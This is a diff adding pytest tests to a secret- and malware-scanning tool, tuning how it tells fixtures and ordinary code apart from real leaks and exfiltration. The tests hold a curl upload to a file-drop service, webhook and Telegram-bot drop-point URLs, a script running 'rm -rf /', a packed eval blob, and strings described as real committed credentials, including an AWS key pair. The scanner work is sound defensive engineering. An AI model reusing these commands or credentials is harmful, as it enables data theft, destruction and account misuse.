+    def test_a_word_that_merely_contains_test_is_not(self, name: str) -> None:
+        """The control that cost the most to get right: `latest.py` and `manifest.py` are
+        ordinary modules, and a substring test would have excused both."""
+        from cordon_scanner.detect.secrets import names_test_file
+
+        assert not names_test_file(f"src/cordon_scanner/{name}")
+
+
+class TestCargoSetsTheseVariablesItself:
+    """Reading the environment in a `build.rs` is what a build script is FOR. Cargo
+    documents the variables it sets before running one, and `FuelLabs/fuels-rs` reads
+    `OUT_DIR` to decide where to write generated code.
+
+    The primitive stays on every other name: narrowing to credential-shaped names would be
+    evaded by reading the whole environment into a map and indexing it afterwards.
+    """
+
+    RULE: ClassVar[str] = "CAP.BUILD.CREDENTIAL.001"
+
+    @classmethod
+    def _matches(cls, line: bytes) -> bool:
+        """Asked of the compiled rule, because a capability primitive is not a reported
+        finding -- it is an input to the composites, so a scan shows nothing either way."""
+        from cordon_scanner.rules.loader import RuleLoader, RuleSet
+
+        compiled = next(r for r in RuleSet(RuleLoader.load_builtin()) if r.id == cls.RULE)
+        return bool(compiled.match.regex.search(line))
+
+    @pytest.mark.parametrize(
+        "name",
+        ["OUT_DIR", "TARGET", "HOST", "PROFILE", "OPT_LEVEL", "NUM_JOBS", "CARGO_PKG_VERSION"],
+    )
+    def test_cargos_own_variables_are_not_credentials(self, name: str) -> None:
+        assert not self._matches(b'let v = std::env::var("' + name.encode() + b'").unwrap();')
+
+    @pytest.mark.parametrize("name", ["NPM_TOKEN", "AWS_SECRET_ACCESS_KEY", "HOME", "PATH"])
+    def test_any_other_name_still_is(self, name: str) -> None:
+        """The control. The list is Cargo's documented set and nothing wider: `HOME` and
+        `PATH` are read by build scripts too, and reading them is still the primitive."""
+        assert self._matches(b'let v = std::env::var("' + name.encode() + b'").unwrap();')
+
+    def test_a_computed_name_is_still_the_primitive(self) -> None:
+        """The evasion the closed list must not open: the name is not a literal at all,
+        so there is nothing to compare against the list and the call has to match."""
+        assert self._matches(b"let t = std::env::var(pick()).unwrap();")
+        assert self._matches(b"let t = std::env::var(&key).unwrap();")
+
+
+class TestATriggerIsAKeyAndNotAString:
+    """`servo/servo` writes `if: github.event_name != 'pull_request_target'` -- a guard
+    that the event is NOT that one. Both PR-target rules matched the string inside the
+    comparison, found a head checkout elsewhere in the same file, and reported the workflow
+    for the trigger it explicitly excludes.
+
+    A trigger is a YAML key. An occurrence inside an expression is a comparison.
+    """
+
+    @staticmethod
+    def _write(tmp_path, trigger: str) -> set[str]:
+        flows = tmp_path / ".github" / "workflows"
+        flows.mkdir(parents=True)
+        (flows / "ci.yml").write_text(
+            f"{trigger}\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n"
+            "      - uses: actions/checkout@v4\n"
+            "        with:\n"
+            "          ref: ${{ github.event.pull_request.head.sha }}\n"
+            "      - run: npm install && npm run build\n"
+        )
+        return {f.rule_id for f in Scanner().scan(tmp_path).findings}
+
+    def test_excluding_the_trigger_is_not_using_it(self, tmp_path) -> None:
+        rules = self._write(
+            tmp_path,
+            "on:\n  pull_request:\n\nenv:\n  GUARD: ${{ github.event_name != 'pull_request_target' }}",
+        )
+        assert "SUSPECT.CI.PR_TARGET.001" not in rules
+        assert "SUSPECT.CI.ARTIFACT_POISONING.001" not in rules
+
+    @pytest.mark.parametrize(
+        "trigger",
+        [
+            "on:\n  pull_request_target:\n    branches: [main]",
+            "on: pull_request_target",
+            "on: [push, pull_request_target]",
+            "on:\n  - pull_request_target",
+        ],
+    )
+    def test_every_spelling_of_the_key_still_reports(self, tmp_path, trigger: str) -> None:
+        """The control, four ways. YAML gives a trigger list three syntaxes and the rule
+        has to read all of them, or the narrowing is an escape hatch."""
+        assert "SUSPECT.CI.PR_TARGET.001" in self._write(tmp_path, trigger)
+
+
+class TestAttributeOnAFieldNotOnAModule:
+    """`#[cfg(test)]` is legal on anything, and `atuinsh/atuin` puts it on a struct field:
+    every entry in its redaction table carries a list of sample credentials to redact.
+
+    The span ran from the attribute to the first `{`, which in
+    `tests: &[Test { ... }, Test { ... }]` is the brace of the FIRST element -- so a
+    second sample in the same list fell outside the span and was reported, and a GitHub
+    PAT the author had expired came out at CRITICAL.
+    """
+
+    @staticmethod
+    def _spans(source: str) -> list[tuple[int, int]]:
+        from cordon_scanner.detect.secrets import test_module_spans
+
+        return [(a, b) for a, b in test_module_spans(source)]
+
+    def test_the_second_element_of_a_list_is_inside(self) -> None:
+        source = (
+            "static P: &[Pattern] = &[Pattern {\n"
+            '    name: "GitHub PAT",\n'
+            "    #[cfg(test)]\n"
+            "    tests: &[\n"
+            '        Test { input: "first" },\n'
+            '        Test { input: "second" },\n'
+            "    ],\n"
+            "}];\n"
+        )
+        second = source.index('"second"')
+        assert any(a <= second < b for a, b in self._spans(source))
+
+    def test_a_module_still_ends_at_its_brace(self) -> None:
+        """The shape the first draft was written for, asserted from the other side: the
+        span must not run past the module into the code below it."""
+        source = '#[cfg(test)]\nmod tests {\n    const K: &str = "x";\n}\n\nfn live() {}\n'
+        after = source.index("fn live")
+        assert not any(a <= after < b for a, b in self._spans(source))
+
+    def test_an_attribute_on_a_statement_ends_at_the_semicolon(self) -> None:
+        source = '#[cfg(test)]\nuse super::*;\n\nconst LIVE: &str = "y";\n'
+        live = source.index('"y"')
+        assert not any(a <= live < b for a, b in self._spans(source))
+
+    def test_a_second_attribute_does_not_become_the_item(self) -> None:
+        """`#[cfg(test)]` then `#[derive(Debug)]`: the first bracket belongs to the
+        derive, and stopping there would make the span the attribute and not the
+        module."""
+        source = '#[cfg(test)]\n#[derive(Debug)]\nmod tests {\n    const K: &str = "z";\n}\n'
+        inner = source.index('"z"')
+        assert any(a <= inner < b for a, b in self._spans(source))
+
+
+class TestARustTestModuleIsNotACapability:
+    """The span above was only ever consulted by the secrets detector. `Hmbown/Codewhale`
+    builds a fleet-host fixture in a `#[cfg(test)]` module -- an SSH identity path and a
+    Slack webhook in the same block -- and the pair was reported as credential access
+    beside a drop point, because the capability detector had no idea the module was tests.
+    """
+
+    FIXTURE: ClassVar[str] = (
+        "pub fn live() -> u8 {\n    7\n}\n\n"
+        "#[cfg(test)]\nmod tests {\n"
+        "    use super::*;\n\n"
+        "    #[test]\n"
+        "    fn round_trip() {\n"
+        '        let identity = "~/.ssh/codewhale_fleet";\n'
+        '        let hook = "https://hooks.slack.com/services/T0/B0/xxxx";\n'
+        "        assert_eq!(live(), 7);\n"
+        "    }\n"
+        "}\n"
+    )
+
+    def test_a_fixture_in_a_test_module_is_not_a_drop_point(self, tmp_path) -> None:
+        crate = tmp_path / "crates" / "protocol"
+        (crate / "src").mkdir(parents=True)
+        (tmp_path / "Cargo.toml").write_text('[workspace]\nmembers = ["crates/protocol"]\n')
+        (crate / "Cargo.toml").write_text('[package]\nname = "protocol"\nversion = "0.1.0"\n')
+        (crate / "src" / "fleet.rs").write_text(self.FIXTURE)
+        assert "SUSPECT.EXFIL.DROP_POINT.001" not in flagged(tmp_path)
+
+    def test_the_same_pair_outside_the_module_still_is(self, tmp_path) -> None:
+        """The control. Nothing changed but the four lines that put it in the tests."""
+        crate = tmp_path / "crates" / "protocol"
+        (crate / "src").mkdir(parents=True)
+        (crate / "Cargo.toml").write_text('[package]\nname = "protocol"\nversion = "0.1.0"\n')
+        (crate / "src" / "fleet.rs").write_text(
+            "pub fn ship() {\n"
+            '    let identity = "~/.ssh/codewhale_fleet";\n'
+            '    let hook = "https://hooks.slack.com/services/T0/B0/xxxx";\n'
+            "    post(hook, identity);\n"
+            "}\n"
+        )
+        assert "SUSPECT.EXFIL.DROP_POINT.001" in flagged(tmp_path)
+
+
+class TestAHostIsNotASubstring:
+    """`vllm` imports `vllm.distributed.weight_transfer.sharded_rdt_common`, and a module
+    path that long contains `transfer.sh` in the middle of it. Every file importing it was
+    reported as contacting a file-drop service, which put three of them one capability
+    short of an exfiltration finding.
+
+    A host has boundaries. On the left, anything but a letter, digit, `_` or `-` -- a dot
+    is allowed, because a subdomain of a drop point is the drop point. On the right, only
+    for the bare-host entries: a path-qualified one is followed by the rest of the URL,
+    and `api.telegram.org/bot` is followed by a token that starts with digits.
+    """
+
+    @staticmethod
+    def _hit(raw: bytes) -> str | None:
+        from cordon_scanner.intel.hosts import destination_matcher
+
+        found = destination_matcher().search(raw)
+        return found.group(0).decode() if found else None
+
+    @pytest.mark.parametrize(
+        "raw",
+        [
+            b"from vllm.distributed.weight_transfer.sharded_rdt_common import check",
+            b"const url = 'https://transfer.shop/catalogue';",
+            b"import { hooksSlackComClient } from './x';",
+        ],
+    )
+    def test_a_host_inside_a_longer_name_is_not_that_host(self, raw: bytes) -> None:
+        assert self._hit(raw) is None
+
+    @pytest.mark.parametrize(
+        ("raw", "expected"),
+        [
+            (b"curl -F file=@x https://transfer.sh/", "transfer.sh"),
+            (b"https://media.discord.com/api/webhooks/1/x", "discord.com/api/webhooks"),
+            (
+                b"https.request({hostname: 'hooks.slack.com', path: '/services/T/B/x'})",
+                "hooks.slack.com",
+            ),
+            (b"https://api.telegram.org/bot8012345:AAExample/sendMessage", "api.telegram.org/bot"),
+        ],
+    )
+    def test_the_real_shapes_still_match(self, raw: bytes, expected: str) -> None:
+        """The control, including the two the boundaries could plausibly have broken: a
+        subdomain on the left and a bot token on the right."""
+        assert self._hit(raw) == expected
+
+
+class TestAPlatformApiIsNotAWebhookIngest:
+    """`WEBHOOK_ONLY_HOSTS` said its members serve nothing but webhook ingest. That was
+    true of `hooks.slack.com`, a subdomain Slack dedicates to it, and false of the three
+    others: `open.feishu.cn`, `oapi.dingtalk.com` and `qyapi.weixin.qq.com` are each the
+    whole of a platform's open API, and the webhook is one path on it.
+
+    All three were already listed in their path-qualified form, which is the treatment
+    `discord.com` gets and for the same stated reason. The bare entries cost three false
+    drop points in a thirty-six repository sample, each a project integrating with the
+    platform it says it integrates with.
+    """
+
+    @staticmethod
+    def _hit(raw: bytes) -> str | None:
+        from cordon_scanner.intel.hosts import destination_matcher
+
+        found = destination_matcher().search(raw)
+        return found.group(0).decode() if found else None
+
+    @pytest.mark.parametrize(
+        "raw",
+        [
+            b"access_token_url='https://open.feishu.cn/open-apis/authen/v2/oauth/token'",
+            b"url = 'https://oapi.dingtalk.com/gettoken?appkey=' + key",
+            b"GET https://qyapi.weixin.qq.com/cgi-bin/user/list?department_id=1",
+        ],
+    )
+    def test_the_platforms_own_api_is_not_a_drop_point(self, raw: bytes) -> None:
+        assert self._hit(raw) is None
+
+    @pytest.mark.parametrize(
+        "raw",
+        [
+            b"post('https://open.feishu.cn/open-apis/bot/v2/hook/abc-def')",
+            b"post('https://oapi.dingtalk.com/robot/send?access_token=x')",
+            b"post('https://qyapi.weixin.qq.com/cgi-bin/webhook/send?key=x')",
+        ],
+    )
+    def test_the_webhook_path_on_each_still_does(self, raw: bytes) -> None:
+        """The control, and the whole reason the bare entries could go."""
+        assert self._hit(raw) is not None
+
+
+class TestABodyThatDecodesToASentence:
+    """`Significant-Gravitas/AutoGPT` vendors Supabase's self-host compose file, and one
+    line carries a Stripe-shaped webhook secret whose base64 body decodes to a sentence
+    announcing itself an example of a shorter base64 string.
+
+    The claim is about randomness and not about the wording: a real secret is random
+    bytes, random bytes are printable ASCII about a third of the time each, and a body
+    that decodes to words and spaces all the way through is not random.
+    """
+
+    @staticmethod
+    def _decodes(body: str) -> bool:
+        from cordon_scanner.detect.secrets import decodes_to_prose
+
+        return decodes_to_prose(body.encode())
+
+    def test_a_sentence_is_not_a_secret(self) -> None:
+        import base64
+
+        sentence = b"This is an example of a shorter Base64 string"
+        assert self._decodes("whsec_" + base64.b64encode(sentence).decode())
+
+    @pytest.mark.parametrize(
+        "body",
+        [
+            "whsec_4eC39HqLyjWDarjtT1zdp7dc8kfYTuRgBiYa15BLrx8etQoX",
+            "whsec_UpNVntn3cDxHJpq99YMc1T1AQgQpc8kf",
+            "whsec_short",
+        ],
+    )
+    def test_a_random_body_is_not_prose(self, body: str) -> None:
+        """The control. Two random bodies and one too short to mean anything either way."""
+        assert not self._decodes(body)
+
+
+class TestAnAccessKeyIdIsNotACredential:
+    """`rust-lang/rust` commits two AWS access key ids in `src/ci/github-actions/jobs.yml`
+    with a comment above explaining the scheme: the ids are in the repository so a key can
+    be rotated on one branch while another keeps the old one, and the secrets live in the
+    CI provider's store. An id is the public name of a credential.
+
+    So this grades rather than dismisses. An id still identifies an account and is worth
+    seeing; it is not the emergency a usable pair is, and reporting it at the same
+    severity is what makes a reader stop reading.
+    """
+
+    @staticmethod
+    def _aws(tmp_path, text: str) -> list:
+        (tmp_path / "jobs.yml").write_text(text)
+        return [
+            f for f in Scanner().scan(tmp_path).findings if f.rule_id == "SECRET.AWS.ACCESS_KEY.001"
+        ]
+
+    def test_an_id_on_its_own_is_graded_down(self, tmp_path) -> None:
+        key = assemble("AKIA", "46X5W6CZI5DHEBFL")
+        found = self._aws(tmp_path, f"env:\n  CACHES_AWS_ACCESS_KEY_ID: {key}\n")
+        assert len(found) == 1
+        assert found[0].severity <= Severity.MEDIUM
+        assert "cannot authenticate" in found[0].message
+
+    def test_the_pair_is_reported_in_full(self, tmp_path) -> None:
+        """The control. `yt-dlp` hardcodes a genuine pair a line apart."""
+        key = assemble("AKIA", "I6X4TYCIXM2B7MUQ")
+        found = self._aws(
+            tmp_path,
+            f"access_key: {key}\nsecret_key: 4WUUJWuFvtTkXbhaWTDv7MhO+0LqoYDWfEnUXoWn\n",
+        )
+        assert len(found) == 1
+        assert found[0].severity >= Severity.HIGH
+
+
+class TestAWasmModuleCannotBeRunByAHook:
+    """`SUSPECT.BINARY.EXECUTABLE_PATH.001` says an executable "sits where a lifecycle step
+    will run it". A `.wasm` has no entry point an operating system or a shell can start:
+    it is instantiated by a host runtime somebody has to write. `excalidraw` keeps
+    `scripts/wasm/hb-subset.wasm`, the HarfBuzz subsetter its font pipeline calls from
+    JavaScript.
+
+    And a `scripts/` seven directories inside `src/` is a module of the program rather
+    than the lifecycle directory a package manager looks in: `microsoft/vscode` ships
+    PowerShell's PSReadLine module under
+    `src/vs/workbench/contrib/terminal/common/scripts/psreadline/`.
+
+    Neither stops being reported. Both still emit `POLICY.BINARY.COMMITTED.001`, which is
+    the true statement about them.
+    """
+
+    WASM: ClassVar[bytes] = b"\x00asm\x01\x00\x00\x00" + b"\x00" * 64
+    ELF_BIN: ClassVar[bytes] = b"\x7fELF" + b"\x00" * 64
+
+    @staticmethod
+    def _at(tmp_path, relative: str, raw: bytes) -> set[str]:
+        target = tmp_path / relative
+        target.parent.mkdir(parents=True, exist_ok=True)
+        target.write_bytes(raw)
+        return {f.rule_id for f in Scanner().scan(tmp_path).findings}
+
+    def test_a_wasm_under_scripts_is_only_a_committed_binary(self, tmp_path) -> None:
+        rules = self._at(tmp_path, "scripts/wasm/hb-subset.wasm", self.WASM)
+        assert "SUSPECT.BINARY.EXECUTABLE_PATH.001" not in rules
+        assert "POLICY.BINARY.COMMITTED.001" in rules
+
+    def test_a_scripts_directory_inside_src_is_part_of_the_source(self, tmp_path) -> None:
+        rules = self._at(
+            tmp_path, "src/vs/workbench/contrib/terminal/common/scripts/ps/mod.dll", self.ELF_BIN
+        )
+        assert "SUSPECT.BINARY.EXECUTABLE_PATH.001" not in rules
+        assert "POLICY.BINARY.COMMITTED.001" in rules
+
+    def test_an_executable_in_the_lifecycle_directory_still_reports(self, tmp_path) -> None:
+        """The control, twice: the rule is about a real executable in the real place."""
+        assert "SUSPECT.BINARY.EXECUTABLE_PATH.001" in self._at(
+            tmp_path, "scripts/helper", self.ELF_BIN
+        )
+        assert "SUSPECT.BINARY.EXECUTABLE_PATH.001" in self._at(
+            tmp_path, "packages/server/scripts/postinstall-helper", self.ELF_BIN
+        )
+
+
+class TestSixNamesAreNotAComputedName:
+    """`odysseus` ends its `setup.py` with a dependency check -- a loop over a literal list
+    of six module names, calling `__import__` on each inside a `try` -- and it was reported
+    at CRITICAL as install-time code reaching a function by a name that cannot be read
+    from the file. All six names are written out two lines above.
+
+    The AST tier exists to resolve what is constant-derivable. A loop variable bound to a
+    list of string literals is derivable: reading the file is reading every value it can
+    take. A list built anywhere else is not followed, because the next thing to follow
+    would be a list that is appended to, and then one built from a response.
+    """
+
+    @staticmethod
+    def _dispatch(source: str) -> list:
+        from cordon_scanner.core.models import Capability
+        from cordon_scanner.detect.pyast import PythonAnalyzer
+
+        return [
+            h for h in PythonAnalyzer.analyse(source) if h.capability is Capability.DYNAMIC_DISPATCH
+        ]
+
+    PROBE: ClassVar[str] = (
+        "def check_deps():\n"
+        "    missing = []\n"
+        '    for mod in ["fastapi", "uvicorn", "sqlalchemy", "bcrypt", "httpx", "dotenv"]:\n'
+        "        try:\n"
+        "            __import__(mod)\n"
+        "        except ImportError:\n"
+        "            missing.append(mod)\n"
+    )
+
+    def test_an_enumerated_name_is_not_dynamic(self) -> None:
+        assert self._dispatch(self.PROBE) == []
+
+    def test_the_whole_file_is_silent_about_it(self, tmp_path) -> None:
+        (tmp_path / "setup.py").write_text("import os\n\n" + self.PROBE)
+        assert "MALWARE.DYNAMIC_DISPATCH.001" not in flagged(tmp_path)
+
+    @pytest.mark.parametrize(
+        "source",
+        [
+            "name = fetch()\n__import__(name).run()\n",
+            "for mod in fetch_list():\n    __import__(mod)\n",
+            "for mod in MODULES:\n    __import__(mod)\n",
+        ],
+    )
+    def test_a_name_from_anywhere_else_still_is(self, source: str) -> None:
+        """The control, three ways -- including a loop whose list is a NAME, which is
+        where following one more step would start down a road with no end."""
+        assert self._dispatch(source)
+
+
+class TestACommentedOutPackerIsNotPackedCode:
+    """`binary-husky/gpt_academic` keeps a Dean Edwards packer preamble behind a `//` in
+    `themes/waifu_plugin/waifu-tips.js`, where an author left the packed form of a widget
+    beside the readable one.
+
+    This rule's claim is that obfuscated code cannot be reviewed. A commented-out blob is
+    not code, and the readable version is on the next line. The obfuscation detector was
+    the only one in the tool with no comment test at all.
+    """
+
+    PACKED: ClassVar[str] = (
+        "eval(function(p,a,c,k,e,r){e=function(c){return c};"
+        "return p}('0 1',2,2,'var|x'.split('|'),0,{}))"
+    )
+
+    @staticmethod
+    def _rules(tmp_path, text: str) -> set[str]:
+        (tmp_path / "widget.js").write_text(text)
+        return {f.rule_id for f in Scanner().scan(tmp_path).findings}
+
+    def test_behind_a_line_comment_it_is_not_reported(self, tmp_path) -> None:
+        body = "\n".join(f"// {self.PACKED}" for _ in range(4))
+        assert "SUSPECT.OBFUSCATION.PACKED.001" not in self._rules(
+            tmp_path, body + "\nvar x = 1;\n"
+        )
+
+    def test_the_same_blob_as_code_is(self, tmp_path) -> None:
+        """The control, and the reason the test is per-occurrence rather than per-file."""
+        body = "\n".join(self.PACKED for _ in range(4))
+        assert "SUSPECT.OBFUSCATION.PACKED.001" in self._rules(tmp_path, body + "\n")
+
+    def test_a_comment_above_real_packed_code_does_not_excuse_it(self, tmp_path) -> None:
+        """The evasion the per-occurrence form must not open: commenting out the first
+        copy while shipping the rest."""
+        body = f"// {self.PACKED}\n" + "\n".join(self.PACKED for _ in range(4))
+        assert "SUSPECT.OBFUSCATION.PACKED.001" in self._rules(tmp_path, body + "\n")
+
+
+class TestAValueThatReadsAsWords:
+    """The largest class in the corpus by a wide margin -- 233 blocking findings from
+    `SECRET.GENERIC.ASSIGNMENT.001` -- and a third of a 194-file sample of it was one
+    shape: a value that is identifiers concatenated.
+
+    `api_key="bdc1DischargePower"` and eleven siblings in an energy monitor, where
+    `api_key` names a data point and the value is the metric. `ss2022Method`.
+    `SsoEmail2faSessionToken`. `Pkcs12SafeBag`, which is a C# base class and not a value
+    at all. `abc123def456`.
+
+    Two consecutive real words is the claim. Every letter run has to be an optional
+    capital and then at least two lowercase letters: `Vr`, `G`, `b` and `DOW` are what a
+    generated run is made of, and `Otm`, `Safe` and `Discharge` are what words are.
+    """
+
+    @staticmethod
+    def _words(value: str) -> bool:
+        from cordon_scanner.detect.secrets import reads_as_words
+
+        return reads_as_words(value.encode())
+
+    @pytest.mark.parametrize(
+        "value",
+        [
+            "echarge1Today",
+            "bdc1DischargePower",
+            "Pkcs12SafeBag",
+            "abc123def456",
+            "global-only",
+        ],
+    )
+    def test_concatenated_identifiers_are_dismissed(self, value: str) -> None:
+        assert self._words(value)
+
+    @pytest.mark.parametrize(
+        "value",
+        [
+            # Every one of these is a real committed credential from the same sample.
+            "bR4SJwOkvnG5WvVJ",
+            "VKEnd3ze4jsKFGg8TJiznwFG8",
+            "dbw2OtmVEeuUvIptb1Coyg",
+            "1NIH5R1IEe2pAxZE3hv3uA",
+            "Og9Vr1L8Ee6bh0olFxFDRg",
+            "3ezkG2XchRFjhNTnK9TE",
+            "k0VMxyIJF9S35f3x2uaw5IWAl6Y536O7",
+            "yz9b4U215iR4vrKFRfjNXP24NMNPKJ",
+            "SPX87dlUuuHpxeh5u3rd7dHekOT6oYpx",
+            "k6QaiQmcTm2zfaNns5L1Z8duBtJmhDOW8JawlCC3",
+            "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",
+            "vX4uM7e7nNGPqjcXycVVhceNR7NQkiMQkR9Hoctf",
+            "dd05f1c54d63749eda95f9fa6d49v442a",
+            "0123456789abcdef0123",
+            "hN8QwG769RqBXmme",
+            # The value an existing guard caught this widening on: three runs, all of
+            # them two or more lowercase letters, and a real corpus credential.
+            "hc2wb63opyfxnwn",
+            # And the two the asymmetry costs, asserted as kept rather than quietly
+            # dropped from the class above: `ss` and `fa` are too short to prove they
+            # are words.
+            "ss2022Method",
+            "SsoEmail2faSessionToken",
+        ],
+    )
+    def test_no_real_credential_in_the_sample_is(self, value: str) -> None:
+        """The control, fifteen ways, and the reason the threshold is two lowercase
+        letters per run rather than one: at one, `Vr` and `Mxy` both read as words and
+        four of these would have gone."""
+        assert not self._words(value)
+
+    def test_one_word_is_not_enough(self) -> None:
+        """`fluttergo123` is a real store password in `alibaba/flutter-go`, and it is one
+        word and a number. Two is where the claim starts to mean something."""
+        assert not self._words("fluttergo123")
+
+
+class TestTheValueIsTheNamePlusAlmostNothing:
+    """`value_is_the_name` asks for exact equality after folding and records why
+    containment is refused: `API_KEY = "api_key_aB3kQ9mZ2xT7"` is a real credential with
+    its own name in front of it.
+
+    This is the narrower question. `E2E_ADMIN_PASSWORD: E2eAdmin12345` in `dify`'s
+    end-to-end workflow shares eight folded characters with its name and then five
+    digits. `bot_token: 123456789:telegram-bot-token` contains `bottoken` and is
+    otherwise one word and one number. `detectorXMLFactoryBypass=XMLFactoryBypass` in
+    `netty`'s `.fbprefs` is the name's own tail.
+    """
+
+    @staticmethod
+    def _restates(name: str, value: str) -> bool:
+        from cordon_scanner.detect.secrets import value_restates_the_name
+
+        return value_restates_the_name(name, value)
+
+    @pytest.mark.parametrize(
+        ("name", "value"),
+        [
+            ("E2E_ADMIN_PASSWORD", "E2eAdmin12345"),
+            ("E2E_INIT_PASSWORD", "E2eInit12345"),
+            ("bot_token", "123456789:telegram-bot-token"),
+            ("detectorXMLFactoryBypass", "XMLFactoryBypass"),
+            ("BETTER_AUTH_SECRET", "better-auth-secret-dev"),
+        ],
+    )
+    def test_the_name_with_a_word_or_a_number_attached(self, name: str, value: str) -> None:
+        assert self._restates(name, value)
+
+    @pytest.mark.parametrize(
+        ("name", "value"),
+        [
+            # The case the docstring of `value_is_the_name` exists to protect.
+            ("API_KEY", "api_key_aB3kQ9mZ2xT7"),
+            ("client_secret", "xcCbOrw6I0vcoXzhnOmXhjpVSyFq0l0e"),
+            ("AppSecret", "bR4SJwOkvnG5WvVJ"),
+            ("password", "a5aeQbaPd4$jR80Q43"),
+            # A name too short to mean anything when it turns up inside a value.
+            ("token", "tokenXQ2mVt7Xb1NpLr4Ws9Dy3Fz6H"),
+        ],
+    )
+    def test_a_credential_carrying_its_own_name_still_reports(self, name: str, value: str) -> None:
+        """The control. Once the name is removed, what is left has to be a word or a
+        number -- `ab3kq9mz2xt7` is eight alternating runs, and that is the difference."""
+        assert not self._restates(name, value)
+
+
+class TestAnObjectFileIsWhateverTheToolchainWrote:
+    """`.o` promised ELF and `.sys` promised PE, and neither is a promise. An object file
+    is ELF, Mach-O, COFF, WebAssembly or a Windows resource object depending on the
+    compiler -- `dotnet/runtime` and `clay` ship wasm ones and `bazel/src/main/cpp/
+    resources.o` is a resource object -- and `.sys` means a PE driver on modern Windows
+    and something else everywhere the name came from: `rufus` ships FreeDOS's
+    `KERNEL.SYS`, syslinux's `ldlinux_v6.sys` opens with its own text header, and
+    `cosmopolitan` keeps terminfo entries at `usr/share/terminfo/a/ansi.sys`.
+
+    Nine `.sys` findings and four `.o` ones across the corpus, every one a file correctly
+    named for what it is. An object file is linked rather than executed, so the
+    substitution this rule exists to notice cannot be made with one.
+    """
+
+    @pytest.mark.parametrize(
+        ("name", "raw"),
+        [
+            ("obj/resources.o", b"\x00\x00\x00\x00 \x00\x00\x00\xff\xff\x00\x00"),
+            ("obj/native-lib.o", b"\x00asm\x01\x00\x00\x00"),
+            ("res/freedos/kernel.sys", b"\xeb\x1bCONFIG\x00\x00"),
+            ("res/syslinux/ldlinux_v6.sys", b"\r\nSYSLINUX 6.04\r\n"),
+            ("usr/share/terminfo/a/ansi.sys", b"\x1a\x01)\x00&\x00\x10\x00"),
+        ],
+    )
+    def test_neither_extension_promises_a_format(self, name: str, raw: bytes) -> None:
+        assert BinaryDetector.mismatch(name, BinaryDetector.identify(raw)) is None
+
+    def test_a_dotnet_native_library_is_named_dll_on_every_platform(self) -> None:
+        """`duplicati` ships `linux-arm-binary/SQLite.Interop.dll`, which is an ELF. The
+        finding read "an executable rather than an executable" -- the message saying in
+        its own words that nothing was disguised."""
+        assert BinaryDetector.mismatch("x/SQLite.Interop.dll", BinaryDetector.identify(ELF)) is None
+
+    def test_a_script_named_dll_is_still_reported(self) -> None:
+        """The control. What the rule is for is a non-executable wearing an executable
+        name, and that is untouched."""
+        found = BinaryDetector.identify(b"#!/bin/sh\necho hi\n")
+        assert BinaryDetector.mismatch("x/helper.dll", found) is not None
+
+
+class TestTheFormatsTheTableDidNotKnow:
+    """Three formats the identifier could not name, each producing a finding that said
+    the contents were "not" the promised format -- true, and useless.
+
+    An empty ZIP has no local file header, because it has no members: it is its
+    end-of-central-directory record alone. An AVIF's signature follows a box length that
+    the table had written out as three specific values. And a PNG that went through a
+    text-mode conversion has U+FFFD where its `0x89` was.
+    """
+
+    @pytest.mark.parametrize(
+        ("name", "raw"),
+        [
+            ("data/empty.zip", b"PK\x05\x06" + b"\x00" * 18),
+            ("notes/x.avif", b"\x00\x00\x00,ftypavif\x00\x00\x00\x00"),
+            # A box length the table never listed, which is the point.
+            ("notes/y.heic", b"\x00\x00\x01\x18ftypheic\x00\x00\x00\x00"),
+            ("www/rlogo.png", b"\xef\xbf\xbdPNG\r\n\x1a\n" + b"\x00" * 8),
+        ],
+    )
+    def test_each_is_recognised_as_what_it_is(self, name: str, raw: bytes) -> None:
+        assert BinaryDetector.mismatch(name, BinaryDetector.identify(raw)) is None
+
+    def test_a_zip_holding_a_script_is_still_reported(self) -> None:
+        """The control: widening a signature must not widen the extension's promise."""
+        found = BinaryDetector.identify(b"#!/bin/sh\nrm -rf /\n")
+        assert BinaryDetector.mismatch("x/payload.zip", found) is not None
+
+
+class TestATokenInAUrlIsASignedLink:
+    """`iptv-org/iptv` lists streams in `streams/my.m3u` whose playlist URLs carry
+    `?token=` and `&auth_key=`, each a signed link with an epoch in it.
+
+    A token in a URL was issued to be handed to somebody: it authorises one object rather
+    than an account, and it expires. Graded rather than dropped, because a URL is also
+    where a real API key gets pasted when somebody is in a hurry.
+    """
+
+    @staticmethod
+    def _findings(tmp_path, text: str) -> list:
+        (tmp_path / "streams.m3u").write_text(text)
+        return [
+            f
+            for f in Scanner().scan(tmp_path).findings
+            if f.rule_id == "SECRET.GENERIC.ASSIGNMENT.001"
+        ]
+
+    def test_a_query_parameter_is_graded(self, tmp_path) -> None:
+        found = self._findings(
+            tmp_path,
+            "#EXTINF:-1,Tv1\nhttps://live.example.my/Tv1/index.m3u8"
+            "?auth_key=1745177809-03fbff3d&token=1745177809-03fbff3dfc194161829ff0dbf94a205a\n",
+        )
+        assert found
+        assert all(f.severity <= Severity.MEDIUM for f in found)
+
+    def test_the_same_value_as_an_assignment_is_not(self, tmp_path) -> None:
+        """The control. Nothing about the value changed; only where it sits did."""
+        found = self._findings(tmp_path, "token = 1745177809-03fbff3dfc194161829ff0dbf94a205a\n")
+        assert found
+        assert any(f.severity >= Severity.HIGH for f in found)
+
+
+class TestTheNamesAFileGivesItsOwnFixtures:
+    """Four path conventions the predicates could not read.
+
+    `photoprism` keeps three session tokens in `internal/entity/auth_session_fixtures.go`,
+    beside the entity it builds them for, which is where Go puts them. `AutoGPT` ships
+    `.env.default` twice. `rclone.1` is a whole command reference as one generated troff
+    file. And `vulhub` keeps one directory per CVE, each holding the weak credentials the
+    environment exists to be exploited through.
+    """
+
+    @pytest.mark.parametrize(
+        "path",
+        [
+            "internal/entity/auth_session_fixtures.go",
+            "app/helpers/user_mocks.ts",
+            "db/seed_data.rb",
+            "backend/.env.default",
+            "frontend/.env.example",
+            "api/.env.production.example",
+            "jumpserver/CVE-2023-42820/config.env",
+        ],
+    )
+    def test_each_is_material_written_for_a_test(self, path: str) -> None:
+        from cordon_scanner.detect.secrets import is_test_material
+
+        assert is_test_material(path)
+
+    @pytest.mark.parametrize("path", ["rclone.1", "man/man8/mount.8"])
+    def test_a_man_page_is_documentation(self, path: str) -> None:
+        from cordon_scanner.detect.secrets import is_documentation
+
+        assert is_documentation(path)
+
+    @pytest.mark.parametrize(
+        "path",
+        [
+            # The controls. `sample` and `example` are filename words and not directory
+            # ones, because `example/` is where a library keeps code to be run and
+            # `seed/` in a data pipeline is production input.
+            "internal/entity/session.go",
+            "backend/.env",
+            "src/seeds/production_loader.go",
+            "cmd/mount.go",
